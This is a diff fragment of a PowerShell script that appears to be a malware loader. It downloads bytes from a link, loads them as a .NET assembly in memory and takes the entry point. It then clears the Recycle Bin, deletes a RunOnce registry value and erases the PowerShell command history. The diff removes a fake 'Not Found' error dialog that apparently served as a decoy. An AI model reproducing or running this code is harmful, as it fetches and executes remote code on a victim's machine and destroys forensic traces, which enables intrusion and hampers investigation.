@@ -4,8 +4,7 @@ $bytes = $webClient.DownloadData($link)
 $assembly = [System.Reflection.Assembly]::Load($bytes)
 $entry = $assembly.EntryPoint
 
-Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("Not Found","Error",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Error)
-       
+
 Clear-RecycleBin -Force
 Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "UpdateExeVolatile" -Force -ErrorAction SilentlyContinue
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
